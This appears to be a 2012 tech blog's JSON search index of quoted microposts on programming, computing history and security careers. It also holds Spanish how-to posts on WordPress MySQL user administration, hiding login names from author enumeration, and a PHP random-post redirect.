non-alphanumeric XSS? The other day one of my friends asked me that question on IRC, pointing me to some articles on sla.ckers.org where they tried to create some scripts like alert(1) with non-alphanumeric characters. As a security researcher and a penetration tester, he insisted that extending that concept to any javascript source would be really useful for bypassing IDSs, IPSs and WAFs. So challange accepted! Patricio Palladino | patriciopalladino.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/13/brainfuck-beware-javascript-is-after-you/","loc":"https://karpoke.ignaciocano.com/2012/08/13/brainfuck-beware-javascript-is-after-you/"},{"title":"I Was a Teenage Hacker","text":"Twenty-four years ago today, I had a very bad day. On August 8, 1988, I was a senior in high school. I was working my after school and weekend job at Safeway as a cashier, when the store manager suddenly walked over and said I better stop ringing up customers and talk to my mother on the store phone right now. Mom told me to come home immediately because, well, there were police at the front door asking for me with some legal papers in hand. Jeff Atwood | codinghorror.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/10/i-was-a-teenage-hacker/","loc":"https://karpoke.ignaciocano.com/2012/08/10/i-was-a-teenage-hacker/"},{"title":"The web architecture of The Internet map","text":"You must have heard about The Internet map by now. If not, you can take a look at it here. Roughly speaking, the Internet Map displays websites' location according to users' behavior. Similar websites visited by the same people are situated close to one another; different websites not having mutual visitors are situated at a considerable distance from each other. The size of a website on the map is determined by its average click rating while the color is defined by belonging to a nationality. You can get a more detailed notion referring to the About section on the website of the Map. In the present article I would like to tell you how the website of The Internet map is organized, which technologies ensure its normal day-to-day functioning and what steps had to be taken in order to sustain a massive surge of visitors wishing to have a look at the map. The operability of the Internet Map is enabled by present-day internet-giants' technologies: the Map's visual display is powered by Google Maps engine by Google Inc., web query processing is performed with Microsoft's .net technologies, while Amazon Web Services by Amazon is responsible for hosting and content delivery. All the three components are vital for the Map's normal operation. With some effort, alternatives can be found, but I am not confident that it will bring much of a benefit. irriss | codeproject.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/08/the-web-architecture-of-the-internet-map/","loc":"https://karpoke.ignaciocano.com/2012/08/08/the-web-architecture-of-the-internet-map/"},{"title":"Did Bill Gates Steal the Heart of DOS?","text":"The history of the computer industry is filled with fascinating tales of riches that appear to practically fall from the sky. Along with stories of riches won, there are stories of opportunities missed. Take that of Ronald Wayne, who cofounded Apple Computer with Steve Wozniak and Steve Jobs but sold his shares for just US \\$2300. And John Atanasoff, who proudly showed his digital computer design to John Mauchly\"who later codesigned the Eniac, often defined as the first electronic computer, without credit to Atanasoff. But by far the most famous story of missed fame and fortune is that of Gary Kildall. A pioneer in computer operating systems, Kildall wrote Control Program for Microcomputers (CP/M), the operating system used on many of the early hobbyist personal computers, such as the MITS Altair 8800, the IMSAI 8080, and the Osborne 1, before IBM introduced its own machine, the PC. Kildall could have virtually owned the personal computer operating system business, had he sold that system to IBM. He didn't. Why is a matter of speculation, mundane gossip, and urban legend. We'll get to that. Bill Gates at Microsoft, however, did sell an operating system to IBM\"and reaped then-unimaginable rewards. A cloud of speculation has hung over that part of the story as well. The big question: Was the operating system Gates sold to IBM his to sell? Or was a key part of it stolen from Kildall? Microsoft has stated that its hands were clean. Kildall maintained that QDOS, and subsequently MS-DOS, had been directly copied from CP/M and thus infringed on his copyright. But until now there's been no way to conduct a reliable examination of the software itself, to look inside MS-DOS for the fingerprints of CP/M, and settle the issue once and for all. Bob Zeidman | spectrum.ieee.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/08/did-bill-gates-steal-the-heart-of-dos/","loc":"https://karpoke.ignaciocano.com/2012/08/08/did-bill-gates-steal-the-heart-of-dos/"},{"title":"Why the Cloud Sucks","text":"I've had too many personal experiences get messed up just because companies change things on the cloud. I've come to a depressed state of feeling that I own nothing on the cloud and have no ability to keep things working the way they do. Features change and get dropped, things you depend on disappear, etc. And no company will ever take responsibility. It's rare to ever get told what really happened. Steve Wozniak | gizmodo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/07/why-the-cloud-sucks/","loc":"https://karpoke.ignaciocano.com/2012/08/07/why-the-cloud-sucks/"},{"title":"Seeing Through Walls With a Wireless Router","text":"Wi-Fi radio signals are found in 61 percent of homes in the U.S. and 25 percent worldwide, so Karl Woodbridge and Kevin Chetty, researchers at University College London, designed their detector to use these ubiquitous signals. When a radio wave reflects off a moving object, its frequency changes\"a phenomenon called the Doppler effect. Their radar prototype identifies frequency changes to detect moving objects. It's about the size of a suitcase and contains a radio receiver composed of two antennas ;íand a signal-processing unit. In tests, they have used it to determine a person's location, speed and direction\"even through a one-foot-thick brick wall. Because the device itself doesn't emit any radio waves, it can't be detected. David Hambling | popsci.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/06/seeing-through-walls-with-a-wireless-router/","loc":"https://karpoke.ignaciocano.com/2012/08/06/seeing-through-walls-with-a-wireless-router/"},{"title":"The website of the world's first-ever web server","text":"CERN, the European Organization for Nuclear Research, is where it all began in March 1989. A physicist, Tim Berners-Lee, wrote a proposal for information management showing how information could be transferred easily over the Internet by using hypertext, the now familiar point-and-click system of navigating through information. The following year, Robert Cailliau, a systems engineer, joined in and soon became its number one advocate. The idea was to connect hypertext with the Internet and personal computers, thereby having a single information network to help CERN physicists share all the computer-stored information at the laboratory. Hypertext would enable users to browse easily between texts on web pages using links. The first examples were developed on NeXT computers. » info.cern.ch","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/06/the-website-of-the-worlds-first-ever-web-server/","loc":"https://karpoke.ignaciocano.com/2012/08/06/the-website-of-the-worlds-first-ever-web-server/"},{"title":"Crowd Source Audit Platform for Manual PenTest","text":"Helping Companies, and Hackers to get things done. Companies test their servers or Web Apps covered by anonymity and confidentiality, while Hackers get paid for what they love to do most: Hacking Servers » hackaserver.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/04/crowd-source-audit-platform-for-manual-pentest/","loc":"https://karpoke.ignaciocano.com/2012/08/04/crowd-source-audit-platform-for-manual-pentest/"},{"title":"De usuarios en WordPress","text":"Uno de los peores hábitos, en cuanto a seguridad en informática se refiere, es utilizar la cuenta de administrador de forma compulsiva para todo, sin importar que la tarea que estemos haciendo requiera privilegios de administrador o no. Esto se puede aplicar tanto a la cuenta de root en un sistema GNU/Linux como al usuario administrador en WordPress. Lo ideal sería utilizar una cuenta con el mínimo nivel de privilegios posible que nos permita llevar a cabo nuestra tarea. En WordPress hay varios niveles de privilegios , desde suscriptor que sólo puede modificar su perfil, hasta super administrador, pasando por diferentes niveles según se permita la creación, edición o eliminación de artículos. Si ya teníamos artículos publicados, por ejemplo con el usuario administrador, y queremos pasarlos a otro usuario, por ejemplo con perfil autor, podemos hacerlo, utilizando la cuenta de administrador, uno a uno. Si teníamos muchos artículos, mejor hacerlo directamente sobre la base de datos. Nos conectamos a la base de datos de WordPress. bash $ mysql -uwpuser -p wpdb Las tablas que vamos a utilizar son wp_posts y wp_users . Podemos ver información relativa a ellas con el comando desc : bash mysql> desc wp_users; +---------------------+---------------------+------+-----+---------------------+----------------+ | Field | Type | Null | Key | Default | Extra | +---------------------+---------------------+------+-----+---------------------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | user_login | varchar(60) | NO | MUL | | | | user_pass | varchar(64) | NO | | | | | user_nicename | varchar(50) | NO | MUL | | | | user_email | varchar(100) | NO | | | | | user_url | varchar(100) | NO | | | | | user_registered | datetime | NO | | 0000-00-00 00:00:00 | | | user_activation_key | varchar(60) | NO | | | | | user_status | int(11) | NO | | 0 | | | display_name | varchar(250) | NO | | | | +---------------------+---------------------+------+-----+---------------------+----------------+ bash mysql> desc wp_posts; +-----------------------+---------------------+------+-----+---------------------+----------------+ | Field | Type | Null | Key | Default | Extra | +-----------------------+---------------------+------+-----+---------------------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | post_author | bigint(20) unsigned | NO | MUL | 0 | | | post_date | datetime | NO | | 0000-00-00 00:00:00 | | | post_date_gmt | datetime | NO | | 0000-00-00 00:00:00 | | | post_content | longtext | NO | MUL | NULL | | | post_title | text | NO | MUL | NULL | | | post_excerpt | text | NO | | NULL | | | post_status | varchar(20) | NO | | publish | | | comment_status | varchar(20) | NO | | open | | | ping_status | varchar(20) | NO | | open | | | post_password | varchar(20) | NO | | | | | post_name | varchar(200) | NO | MUL | | | | to_ping | text | NO | | NULL | | | pinged | text | NO | | NULL | | | post_modified | datetime | NO | | 0000-00-00 00:00:00 | | | post_modified_gmt | datetime | NO | | 0000-00-00 00:00:00 | | | post_content_filtered | longtext | NO | | NULL | | | post_parent | bigint(20) unsigned | NO | MUL | 0 | | | guid | varchar(255) | NO | | | | | menu_order | int(11) | NO | | 0 | | | post_type | varchar(20) | NO | MUL | post | | | post_mime_type | varchar(100) | NO | | | | | comment_count | bigint(20) | NO | | 0 | | +-----------------------+---------------------+------+-----+---------------------+----------------+ Necesitamos conocer los identificadores del usuario origen y usuario destino. Por ejemplo: bash mysql> select ID, user_login from wp_users; +----+------------+ | ID | user_login | +----+------------+ | 1 | admin | | 2 | user | +----+------------+ Cambiamos los artículos del viejo usuario (con identificador 1) al nuevo usuario (con identificador 2): bash mysql> update wp_posts set post_author=2 where post_author=1; Y listos. Cambiar el nombre de usuario Cambiar el nombre de usuario que se utiliza para iniciar sesión, una vez creado el usuario, es algo que no se puede hacer desde el panel de administración de WordPress, pero podemos cambiarlo desde la consola MySQL. Por ejemplo, para cambiar el usuario admin por newlogin : bash $ update wp_users set user_login=\"newlogin\" where user_login=\"admin\"; Actualizado el 12 de enero de 2014 Enumeración de usuarios WordPress permite mostrar un listado de los artículos de cada usuario mediante una URL como http://www.example.com/author/username/ . El problema es que, por defecto, este nombre de usuario coincide con el nombre de usuario que se utiliza para iniciar sesión en el panel de administración. Encontrar este nombre de usuario no es difícil, ya que los enlaces del tipo http://www.example.com/?author=1 redirigen a un enlace como el anterior, pero con el nombre del usuario que se corresponde con el identificador utilizado, en este ejemplo el 1, que además suele ser el usuario administrador. Afortunadamente, se pueden tener nombres de usuario diferentes para iniciar sesión y para mostrar los artículos de un usuario a través el campo user_nicename . Podemos modificar el nuestro mediante: bash mysql> update wp_users set user_nicename=\"nick\" where user_login=\"username\"; Actualizado el 15 de agosto de 2012 Cambiar la información del autor de los comentarios Los comentarios en WordPress también tienen asociado un usuario. Primero veamos los campos que tiene la tabla wp_comments : bash mysql> desc wp_comments; +----------------------+---------------------+------+-----+---------------------+----------------+ | Field | Type | Null | Key | Default | Extra | +----------------------+---------------------+------+-----+---------------------+----------------+ | comment_ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | comment_post_ID | bigint(20) unsigned | NO | MUL | 0 | | | comment_author | tinytext | NO | | NULL | | | comment_author_email | varchar(100) | NO | | | | | comment_author_url | varchar(200) | NO | | | | | comment_author_IP | varchar(100) | NO | | | | | comment_date | datetime | NO | | 0000-00-00 00:00:00 | | | comment_date_gmt | datetime | NO | MUL | 0000-00-00 00:00:00 | | | comment_content | text | NO | | NULL | | | comment_karma | int(11) | NO | | 0 | | | comment_approved | varchar(20) | NO | MUL | 1 | | | comment_agent | varchar(255) | NO | | | | | comment_type | varchar(20) | NO | | | | | comment_parent | bigint(20) unsigned | NO | MUL | 0 | | | user_id | bigint(20) unsigned | NO | | 0 | | +----------------------+---------------------+------+-----+---------------------+----------------+ Si el usuario está registrado, el campo user_id tiene el identificador del usuario, sino le asigna un 0. Sin embargo, el nombre, la URL y el correo electrónico, que queda registrado aunque no se muestre, son los que tuviera el usuario en el momento de hacer el comentario, por lo que si el usuario los modifica posteriormente, los cambios no quedan reflejados en los comentarios anteriores. Para ver los comentarios de usuarios registrados podemos ejecutar: bash mysql> select comment_author, comment_author_url, comment_author_email, comment_author_IP, user_id from wp_comments where user_id != 0; Si queremos cambiar el autor de los comentarios de un usuario concreto y actualizar la información asociada, por ejemplo cambiar el autor de los comentarios del usuario con identificador 1 al que tiene el 2, no tenemos más que ejecutar: bash mysql> update wp_comments c, wp_users u set c.comment_author=u.user_nicename, c.comment_author_url=u.user_url, c.comment_author_email=u.user_email, c.user_id=u.ID where u.ID=2 and c.user_id=1; Dependiendo de la configuración de MySQL, es posible que nos aparezca el siguiente error: bash ERROR 1175 (HY000): You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column Si están activadas las actualizaciones seguras , no se permite ejecutar ninguna sentencia de actualización o borrado si no se utiliza un campo clave en el WHERE o no se utiliza la cláusula LIMIT. En este caso no estamos seleccionando los comentarios por ningún campo clave, de ahí que aparezca el error. Podemos desactivar las actualizaciones seguras ejecutando: bash mysql> set SQL_SAFE_UPDATES=0; Y ahora ya sí que nos dejará ejecutar la actualización. Si queremos volver a activar las actualizaciones seguras, no tenemos más que asignarle un valor de 1.","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/08/02/de-usuarios-en-wordpress/","loc":"https://karpoke.ignaciocano.com/2012/08/02/de-usuarios-en-wordpress/"},{"title":"Using Bipolar Transistors As Switches","text":"While transistors have many uses, one of the less known uses by amateurs is the ability for bipolar transistors to turn things on and off. While there are limitations as to what we can switch on and off, transistor switches offer lower cost and substantial reliability over conventional mechanical relays. In this article, we will review the basic principles for transistor switches using common bipolar transistors. The most commonly used transistor switch is the PNP variety shown in Figure 1. The secret to making a transistor switch work properly is to get the transistor in a saturation state. For this to happen we need to know the maximum load current for the device to be turned on and the minimum HFE of the transistor. Mike Martell | rason.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/02/using-bipolar-transistors-as-switches/","loc":"https://karpoke.ignaciocano.com/2012/08/02/using-bipolar-transistors-as-switches/"},{"title":"La ESI de Ciudad Real libera 4 libros sobre Desarrollo de Videojuegos","text":"La Escuela Superior de Informática de la Universidad de Castilla-La Mancha ha liberado el material de la primera edición del Curso de Experto en Desarrollo de Videojuegos. El material, compuesto por 4 libros de más de 1.200 páginas en total y múltiples ejemplos de código fuente, se basa principalmente en tecnologías y estándares libres. Casi la totalidad de los ejemplos del curso han sido desarrollados en GNU/Linux. Puedes descargar los libros gratuitamente en la web del curso (formato PDF), en EPUB o comprar los libros en papel. Los ejemplos del libro se distribuye con licencia GPLv3 y el libro con licencia Creative Commons BY NC ND » cursodesarrollovideojuegos.com | via barrapunto.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/01/la-esi-de-ciudad-real-libera-4-libros-sobre-desarrollo-de-videojuegos/","loc":"https://karpoke.ignaciocano.com/2012/08/01/la-esi-de-ciudad-real-libera-4-libros-sobre-desarrollo-de-videojuegos/"},{"title":"Introduction to text manipulation on UNIX-based systems","text":"A basic tenets of UNIX philosophy is to create programs (or processes) that do one thing, and do that one thing well. It is a philosophy demanding careful thought about interfaces and ways of joining these smaller (hopefully more simple) processes together to create useful results. Normally textual data flows between these interfaces. Over time, more and more advanced text processing tools and languages have been developed. For languages, earlier on there was perl, later came python, and ruby. While these and other languages are very capable text processors, such tools are not always available, especially in a production environment. In this article, a number of basic UNIX text processing commands are demonstrated and may be used individually or in conjunction with each other to solve problems which may also be addressed with newer languages. For many people, an example provides more information than long winded explanations. Please note because of the variety of UNIX and UNIX-like systems available, command flags, program behavior, and output differs between implementations. Brad Yoes | ibm.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/31/introduction-to-text-manipulation-on-unix-based-systems/","loc":"https://karpoke.ignaciocano.com/2012/07/31/introduction-to-text-manipulation-on-unix-based-systems/"},{"title":"Learn Vim Progressively","text":"You want to teach yourself vim (the best text editor known to human kind) in the fastest way possible. This my way of doing it. You start by learning the minimal to survive, then you integrate all the tricks slowly. Vim the Six Billion Dollar editor Better, Stronger, Faster. Learn vim and it will be your last text editor. There isn't any better text editor that I know of. It is hard to learn, but incredible to use. I suggest you teach yourself Vim in 4 steps: Survive Feel comfortable Feel Better, Stronger, Faster Use superpowers of vim By the end of this journey, you'll become a vim superstar. But before we start, just a warning. Learning vim will be painful at first. It will take time. It will be a lot like playing a musical instrument. Don't expect to be more efficient with vim than with another editor in less than 3 days. In fact it will certainly take 2 weeks instead of 3 days. Yann Esposito | yannesposito.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/31/learn-vim-progressively/","loc":"https://karpoke.ignaciocano.com/2012/07/31/learn-vim-progressively/"},{"title":"N-Tier Architecture And Tips","text":"N-Tier architecture is an industry-proved software architecture model, suitable to support enterprise-level client/server applications by resolving issues like scalability, security, fault tolerance and etc. .NET has many tools and features, but .NET doesn't have pre-defined ways to guard how to implement N-Tier architecture. Therefore, in order to achieve good design and implementation of N-Tier architecture in .NET, understanding fully its concepts is very important. However, many of us may hear, read or use N-Tier architecture for many years but still misunderstand its concepts more or less. This article tries to clarify many basic concepts in N-Tier architecture from all aspects, and also provide some practical tips. The tips in this article are based on the assumption that a team has a full control over all layers of the N-Tier architecture. W. HU | codeproject.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/31/n-tier-architecture-and-tips/","loc":"https://karpoke.ignaciocano.com/2012/07/31/n-tier-architecture-and-tips/"},{"title":"I won't hire people who use poor grammar. here's why.","text":"In the same vein, programmers who pay attention to how they construct written language also tend to pay a lot more attention to how they code. You see, at its core, code is prose. Great programmers are more than just code monkeys; according to Stanford programming legend Donald Knuth they are \"essayists who work with traditional aesthetic and literary forms.\" The point: programming should be easily understood by real human beings \" not just computers. And just like good writing and good grammar, when it comes to programming, the devil's in the details. In fact, when it comes to my whole business, details are everything. Kyle Wiens | blogs.hbr.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/31/i-wont-hire-people-who-use-poor-grammar-heres-why/","loc":"https://karpoke.ignaciocano.com/2012/07/31/i-wont-hire-people-who-use-poor-grammar-heres-why/"},{"title":"Monkey Island y LucasArts: de referencias a referente","text":"En un lugar de Melee Island&#94;TM&#94; de cuyo nombre no quiero acordarme, nuestro wannabe pirata se llamaba Guybrush Threepwood. Tenía unos veinte años, y pesaba poco más de 54 kilos. Aguantaba la respiración durante 10 minutos, intentaba vender unas bonitas chaquetas de piel y soñaba con ser pirata. Todo eran peleas de espadas e insultos, grog y pollos de goma con poleas en medio, hasta que cayó enamorado de la gobernadora Marley que, tras ser secuestrada, le condujo hasta el malvado y temible pirata fantasma LeChuck. Supongo que la mayoría de los que tienen infancia habrán reconocido en apenas dos líneas que se trata de –seguramente- la aventura gráfica más famosa de LucasArts: Monkey Island. blissy91 | tuprincesaestaenotrocastillo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/31/monkey-island-y-lucasarts-de-referencias-a-referente/","loc":"https://karpoke.ignaciocano.com/2012/07/31/monkey-island-y-lucasarts-de-referencias-a-referente/"},{"title":"El dios de las pequeñas rendijas","text":"Ninguna multinacional tiene tantas sucursales, ninguna empresa engloba tanto personal a su cargo y ningún holding ha podido sacar al mercado un producto más rentable. Jamás ha existido un negocio tan beneficioso y duradero a pesar de haber demostrado con el paso del tiempo estar tan radicalmente equivocado en sus afirmaciones. Es el sueño dorado de cualquier empresario: crecer sin límite sin que ninguno de tus errores detenga tu prosperidad. Javier Peláez | aldea-irreductible.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/31/el-dios-de-las-pequenas-rendijas/","loc":"https://karpoke.ignaciocano.com/2012/07/31/el-dios-de-las-pequenas-rendijas/"},{"title":"Bash prompts","text":"You can tell a lot about a shell user by looking at their prompt. Most shell users will use whatever the system's default prompt is for their entire career. Under many Linux distributions, this prompt includes the username, the hostname, and the current working directory, along with a \\$ sigil for regular users, and a # for root. Tom Ryder | blog.sanctum.geek.nz","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/27/bash-prompts/","loc":"https://karpoke.ignaciocano.com/2012/07/27/bash-prompts/"},{"title":"Carcasa en madera de contrachapado para Raspberry Pi","text":"Por ahora, la Raspberry Pi viene sin carcasa, por lo que no sólo hay opciones comerciales, sino que la comunidad ha tenido ideas muy creativas: [ 1 ], [ 2 ] y [ 3 ]. Entre todas las opciones, la de imprimir tu propia carcasa me ha llamado la atención. Es sencilla, rápida de hacer y, sobre todo, incluye un plano . Utilizando este plano como base, hemos fabricado una carcasa en madera de contrachapado de 3mm. Las dimensiones del plano encajan en la Raspberry Pi como anillo al dedo. Lo único que hemos tenido que tener en cuenta es el grosor de la madera para las piezas laterales: aumentar el alto de las piezas laterales largas en 3mm por arriba y 3mm por abajo aumentar el ancho y el alto de las piezas laterales cortas en 3mm en cada lado las piezas superior e inferior tienen la misma medida que en el plano Éste es el resultado: Referencias » Punnet, a home printable cardboard case for your Raspberry Pi","tags":"memo","url":"https://karpoke.ignaciocano.com/2012/07/27/carcasa-en-madera-de-contrachapado-para-raspberry-pi/","loc":"https://karpoke.ignaciocano.com/2012/07/27/carcasa-en-madera-de-contrachapado-para-raspberry-pi/"},{"title":"Saltar a una entrada aleatoria en WordPress","text":"Si queremos añadir un enlace que nos permita saltar a una entrada aleatoria de un blog en WordPress, basta crear un archivo que contenga lo siguiente: php <?php require('wp-blog-header.php'); query_posts(array('orderby' => 'rand', 'showposts' => 1)); if (have_posts()) : the_post(); $url = get_permalink($post->id); header(\"Location: \" . $url); endif; wp_reset_query(); ?> Guardamos el archivo en una ruta accesible, por ejemplo en la raíz del blog. Sólo queda añadir el enlace para que nos lleve a una entrada aleatoria . PS: Recordando una vieja entrada en Microsiervos . Actualizado el 28 de septiembre de 2012 WordPress puede utilizar URLs claras para enlazar a los artículos, categorías, etiquetas, páginas o archivos. Si queremos que el enlace al script sea del mismo tipo, podemos añadir las siguientes líneas al fichero .htaccess de la raíz del sitio: bash RewriteEngine On RewriteBase /blog/ RewriteRule &#94;salta/$ salta.php Referencias » Function Reference/query posts » The Loop » Template Tags/get posts","tags":"dev","url":"https://karpoke.ignaciocano.com/2012/07/27/saltar-a-una-entrada-aleatoria-en-wordpress/","loc":"https://karpoke.ignaciocano.com/2012/07/27/saltar-a-una-entrada-aleatoria-en-wordpress/"},{"title":"The Humble Programmer","text":"As a result of a long sequence of coincidences I entered the programming profession officially on the first spring morning of 1952 and as far as I have been able to trace, I was the first Dutchman to do so in my country. In retrospect the most amazing thing was the slowness with which, at least in my part of the world, the programming profession emerged, a slowness which is now hard to believe. But I am grateful for two vivid recollections from that period that establish that slowness beyond any doubt. After having programmed for some three years, I had a discussion with A. van Wijngaarden, who was then my boss at the Mathematical Centre in Amsterdam, a discussion for which I shall remain grateful to him as long as I live. The point was that I was supposed to study theoretical physics at the University of Leiden simultaneously, and as I found the two activities harder and harder to combine, I had to make up my mind, either to stop programming and become a real, respectable theoretical physicist, or to carry my study of physics to a formal completion only, with a minimum of effort, and to become....., yes what? A programmer? But was that a respectable profession? For after all, what was programming? Where was the sound body of knowledge that could support it as an intellectually respectable discipline? I remember quite vividly how I envied my hardware colleagues, who, when asked about their professional competence, could at least point out that they knew everything about vacuum tubes, amplifiers and the rest, whereas I felt that, when faced with that question, I would stand empty-handed. Full of misgivings I knocked on van Wijngaarden's office door, asking him whether I could \"speak to him for a moment\"; when I left his office a number of hours later, I was another person. For after having listened to my problems patiently, he agreed that up till that moment there was not much of a programming discipline, but then he went on to explain quietly that automatic computers were here to stay, that we were just at the beginning and could not I be one of the persons called to make programming a respectable discipline in the years to come? This was a turning point in my life and I completed my study of physics formally as quickly as I could. One moral of the above story is, of course, that we must be very careful when we give advice to younger people; sometimes they follow it! Edsger W. Dijkstra | cs.utexas.edu","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/26/the-humble-programmer/","loc":"https://karpoke.ignaciocano.com/2012/07/26/the-humble-programmer/"},{"title":"System Administrator Appreciation Day","text":"System AdministratorAppreciation Dayhis website from its box, installed an operating system, patched it for security, made sure the power and air conditioning was working in the server room, monitored it for stability, set up the software, and kept backups in case anything went wrong. All to serve this webpage. » sysadminday.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/26/system-administrator-appreciation-day/","loc":"https://karpoke.ignaciocano.com/2012/07/26/system-administrator-appreciation-day/"},{"title":"So You Want to Be a Security Expert","text":"I regularly receive e-mail from people who want advice on how to learn more about computer security, either as a course of study in college or as an IT person considering it as a career choice. First, know that there are many subspecialties in computer security. You can be an expert in keeping systems from being hacked, or in creating unhackable software. You can be an expert in finding security problems in software, or in networks. You can be an expert in viruses, or policies, or cryptography. There are many, many opportunities for many different skill sets. You don't have to be a coder to be a security expert. In general, though, I have three pieces of advice to anyone who wants to learn computer security. Bruce Schneier | schneier.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/so-you-want-to-be-a-security-expert/","loc":"https://karpoke.ignaciocano.com/2012/07/24/so-you-want-to-be-a-security-expert/"},{"title":"Todos los emuladores para Android","text":"Muchos de nosotros somos auténticos gamers en Android, y como buenos jugones, nos encantan los juegos de vieja escuela. Sí, ya sabéis, los clásicos: Mario Kart, Super Mario 64, cualquier juego de la Nes/Snes, etc¦ Y digo yo, con estos auténticas bestias de Android que tenemos, ¿no deberíamos poder jugar a todos ellos? Pues efectivamente, se puede. El único problema es que por razón X, a Google no le gusta mucho que hayan emuladores en el Play Store y por ello se encuentran tan pocos. Pero tranquilos que hoy os traemos una recopilación de todos los emuladores actuales a los que se puede jugar en Android Adrian | elandroidelibre.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/todos-los-emuladores-para-android/","loc":"https://karpoke.ignaciocano.com/2012/07/24/todos-los-emuladores-para-android/"},{"title":"Understanding Python Decorators in 12 Easy Steps!","text":"Ok, perhaps I jest. As a Python instructor, understanding decorators is a topic I find students consistently struggle with upon first exposure. That's because decorators are hard to understand! Getting decorators requires understanding several functional programming concepts as well as feeling comfortable with some unique features of Python's function definition and function calling syntax. _Using_ decorators is easy (see Section 10)! But writing them can be complicated. I can't make decorators easy - but maybe by walking through each piece of the puzzle one step at a time I can help you feel more confident in understanding decorators[1]. Because decorators are complex this is going to be a long article - but stick with it! I promise to make each piece as simple as possible - and if you understand each piece, you'll understand how decorators work! I'm trying to assume minimal Python knowledge but this will probably be most helpful to people who have at least a casual working exposure to Python. Simeon Franklin | simeonfranklin.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/understanding-python-decorators-in-12-easy-steps/","loc":"https://karpoke.ignaciocano.com/2012/07/24/understanding-python-decorators-in-12-easy-steps/"},{"title":"The Geek Syndrome","text":"Nick is building a universe on his computer. He's already mapped out his first planet: an anvil-shaped world called Denthaim that is home to gnomes and gods, along with a three-gendered race known as kiman. As he tells me about his universe, Nick looks up at the ceiling, humming fragments of a melody over and over. \"I'm thinking of making magic a form of quantum physics, but I haven't decided yet, actually,\" he explains. The music of his speech is pitched high, alternately poetic and pedantic - as if the soul of an Oxford don has been awkwardly reincarnated in the body of a chubby, rosy-cheeked boy from Silicon Valley. Nick is 11 years old. Nick's father is a software engineer, and his mother is a computer programmer. They've known that Nick was an unusual child for a long time. He's infatuated with fantasy novels, but he has a hard time reading people. Clearly bright and imaginative, he has no friends his own age. His inability to pick up on hidden agendas makes him easy prey to certain cruelties, as when some kids paid him a few dollars to wear a ridiculous outfit to school. One therapist suggested that Nick was suffering from an anxiety disorder. Another said he had a speech impediment. Then his mother read a book called Asperger's Syndrome: A Guide for Parents and Professionals. In it, psychologist Tony Attwood describes children who lack basic social and motor skills, seem unable to decode body language and sense the feelings of others, avoid eye contact, and frequently launch into monologues about narrowly defined - and often highly technical - interests. Even when very young, these children become obsessed with order, arranging their toys in a regimented fashion on the floor and flying into tantrums when their routines are disturbed. As teenagers, they're prone to getting into trouble with teachers and other figures of authority, partly because the subtle cues that define societal hierarchies are invisible to them. Steve Silberman | wired.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/the-geek-syndrome/","loc":"https://karpoke.ignaciocano.com/2012/07/24/the-geek-syndrome/"},{"title":"The Mathematics of Autism","text":"Autism may be associated with mathematical skills. Autism researcher Simon Baron-Cohen has published studies that autism is more prevalent in the familes of physicists, engineers, and mathematicians. Unusual mathematical skills are reported in a small percentage of cases of \"classic autism.\" Movies, television, and popular culture such as Rainman (1988), Mercury Rising (1998), and many other works often play up this rare association by presenting autistic characters with extreme mathematical abilities. It has frequently been suggested that various scientists and mathematicians including the Nobel Prize winning physicist Paul Dirac, the Russian mathematician and Fields Medal refuser Grigori Perelman, and Fields Medal winner Richard Borcherds have had or have Asperger's Syndrome, now included in the autism spectrum. Vernon L. Smith who won the Nobel Prize for Economics in 2002 has stated that he has Asperger's Syndrome. Wired Magazine popularized the notion of an association of Asperger's syndrome and autism with computer technology and math in the article The Geek Syndrome by Steve Silberman. John F. McGowan | math-blog.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/the-mathematics-of-autism/","loc":"https://karpoke.ignaciocano.com/2012/07/24/the-mathematics-of-autism/"},{"title":"12 Reasons Why Every Linux System Administrator Should be Lazy","text":"Lazy sysadmin is the best sysadmin –Anonymous System administrators job is not visible to other IT groups or end-users. Mostly they look at administrators and wonder why sysadmins don't seem to have any work. If you see a sysadmin who is always running around, and trying to put down fire, and constantly dealing with production issues, you might think he is working very hard, and really doing his job. But in reality he is not really doing his job. If you see a sysadmin (UNIX/Linux sysadmin, or DBA, or Network Administrators), who doesn't seem to be doing much around the office that you can see, he always seem to be relaxed, and he don't seem to have any visible work, you can be assured that he is doing his job. Ramesh Natarajan | thegeekstuff.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/12-reasons-why-every-linux-system-administrator-should-be-lazy/","loc":"https://karpoke.ignaciocano.com/2012/07/24/12-reasons-why-every-linux-system-administrator-should-be-lazy/"},{"title":"Does Bitrate Really Make a Difference In My Music?","text":"While you may have some idea about what bitrate is, the \"can audiophiles really tell the difference\" argument has raged on for quite some time, and it's hard to get people to drop their egos and actually explain what these things mean and whether they really matter. Here's a bit of information on bitrate and how it applies to our practical music listening experience. Whitson Gordon 